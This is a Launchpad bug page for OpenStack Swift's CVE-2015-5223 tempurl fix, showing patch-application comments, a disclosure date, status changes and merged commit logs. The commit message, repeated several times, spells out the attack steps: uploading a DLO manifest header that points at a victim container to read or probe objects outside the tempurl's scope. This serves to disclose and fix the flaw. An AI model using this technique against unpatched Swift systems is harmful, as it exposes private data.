Can you also attach a version of the patch in #85 with the patch for [bug 1453948](/bugs/1453948) (the one in comment #15) ?

Regardless of the order, they don't apply cleanly.

Can you also attach a version of the patch in #85 with the patch for bug 1453948 (the one in comment #15) ?
Regardless of the order, they don't apply cleanly.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-20: |  |  | [#93](/swift/%2Bbug/1449212/comments/93) |
| --- | --- | --- | --- |

* [combined dlo & container tempurl fixes for master (ef8f14f)](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4449743/%2Bfiles/master-tempurl-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4449743)
  (37.2 KiB,
  text/plain)

Ain't nobody trust that crazy -3 business!

(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git log -n 1 --oneline

    ef8f14f Merge "Add OpenStack release names to changelog"

    (swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git am < master-tempurl-combined.patch

    Applying: Disallow unsafe tempurl operations to point to unauthorized data

    Applying: Better scoping for tempurls, especially container tempurls

Ain't nobody trust that crazy -3 business!
(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git log -n 1 --oneline
ef8f14f Merge "Add OpenStack release names to changelog"
(swift)clayg:~/Workspace/vagrant-swift-all-in-one/swift$ git am < master-tempurl-combined.patch
Applying: Disallow unsafe tempurl operations to point to unauthorized data
Applying: Better scoping for tempurls, especially container tempurls

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-20: |  |  | [#94](/swift/%2Bbug/1449212/comments/94) |
| --- | --- | --- | --- |

Thanks clayg,

the proposed disclosure date is:

2015-08-26, 1500UTC

Thanks clayg,
the proposed disclosure date is:
2015-08-26, 1500UTC

| Changed in ossa: | |
| --- | --- |
| **assignee**: | nobody → Tristan Cacqueray (tristan-cacqueray) |
| **status**: | Confirmed → Fix Committed |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **information type**: | Private Security → Public Security |
| --- | --- |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (master)**](/swift/%2Bbug/1449212/comments/95) |  |  | [#95](/swift/%2Bbug/1449212/comments/95) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/95/%2Bdownload) (3.3 KiB)

Reviewed: <https://review.openstack.org/217260>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=d4409c0a046c6ce0e14e18c95efe2cd16cf120e8>

Submitter: Jenkins

Branch: master

commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8

Author: Samuel Merritt <email address hidden>

Date: Tue Aug 11 09:10:13 2015 -0500

Better scoping for tempurls, especially container tempurls

It used to be that a GET of a tempurl referencing a large object would

    let you download that large object regardless of where its segments

    lived. However, this led to some violated user expectations around

    container tempurls.

(Note on shorthand: all tempurls reference objects. However, "account

    tempurl" and "container tempurl" are shorthand meaning tempurls

    generated using a key on the account or container, respectively.)

Let's say an application is given tempurl keys to a particular

    container, and it does all its work therein using those keys. The user

    expects that, if the application is compromised, then the attacker

    only gains access to the "compromised-container". However, with the old

    behavior, the attacker could read data from \*any\* container like so:

1) Choose a "victim-container" to download

2) Create PUT and GET tempurl for any object name within the

       "compromised-container". The object doesn't need to exist;

       we'll create it.

3) Using the PUT tempurl, upload a DLO manifest with

       "X-Object-Manifest: /victim-container/"

4) Using the GET tempurl, download the object created in step 3. The

       result will be the concatenation of all objects in the

       "victim-container".

Step 3 need not be for all objects in the "victim-container"; for

    example, a value "X-Object-Manifest: /victim-container/abc" would only

    be the concatenation of all objects whose names begin with "abc". By

    probing for object names in this way, individual objects may be found

    and extracted.

A similar bug would exist for manifests referencing other accounts

    except that neither the X-Object-Manifest (DLO) nor the JSON manifest

    document (SLO) have a way of specifying a different account.

This change makes it so that a container tempurl only grants access to

    objects within its container, \*including\* large-object segments. This

    breaks backward compatibility for container tempurls that may have

    pointed to cross container \*LO's, but (a) there are security

    implications, and (b) container tempurls are a relatively new feature.

This works by having the tempurl middleware install an authorization

    callback ('swift.authorize' in the WSGI environment) that limits the

    scope of any requests to the account or container from which the key

    came.

This requires swift.authorize to persist for both the manifest request

    and all segment requests; this is done by having the proxy server

    restore it to the WSGI environment prior to returning from \_\_call\_\_.

[CVE-2015-5223]

Co-Authored-By: Clay Gerrard <email address hidden>

    Co-Authored-By: Alistair Coles <alistair.coles@h...

[Read more...](/swift/%2Bbug/1449212/comments/95)

Reviewed: https://review.openstack.org/217260
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Submitter: Jenkins
Branch: master
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212

| Changed in swift: | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-09-01

| Changed in swift: | |
| --- | --- |
| **milestone**: | none → 2.4.0 |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-02:  [**Fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1449212/comments/96) |  |  | [#96](/swift/%2Bbug/1449212/comments/96) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/219775>

Fix proposed to branch: feature/crypto
Review: https://review.openstack.org/219775

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Fix merged to swift (feature/crypto)**](/swift/%2Bbug/1449212/comments/97) |  |  | [#97](/swift/%2Bbug/1449212/comments/97) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/97/%2Bdownload) (43.3 KiB)

Reviewed: <https://review.openstack.org/219775>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531>

Submitter: Jenkins

Branch: feature/crypto

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender throws HTTP right out the

    window, picks up his ball, and closes the socket down hard - much to the

    surprise of the eventlet.wsgi server who up to this point had been

    playing along quite nicely with this 'SSYNC' nonsense assuming that

    everyone here is consenting mature adults.

If you're going to make a "Transfer-Encoding: chunked" request have the

    good decency to finish the job with a proper '0\r\n\r\n'. [1]

N.B. It might be possible to handle an error status during the

    initialize\_request phase with some sort of 100-continue support, but

    honestly it's not entirely clear to me when the server isn't going to

    close the connection if the client is still expected to send the body

    [2] - further if the error comes later during missing\_check or updates

    we'll for sure want to send the chunk transfer termination line before

    we close down the socket and this way we cover both.

1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]

    2. <https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html>

    3. <https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5>

Closes-[Bug #1489587](/bugs/1489587)

    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3

Author: nakagawamsa <email address hidden>

Date: Fri Aug 28 11:49:43 2015 +0900

Remove duplicate X-Backend-Storage-Policy-Index key

There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.

    One key has fixed policy index value, and another ha...

Reviewed: https://review.openstack.org/219775
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531
Submitter: Jenkins
Branch: feature/crypto
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
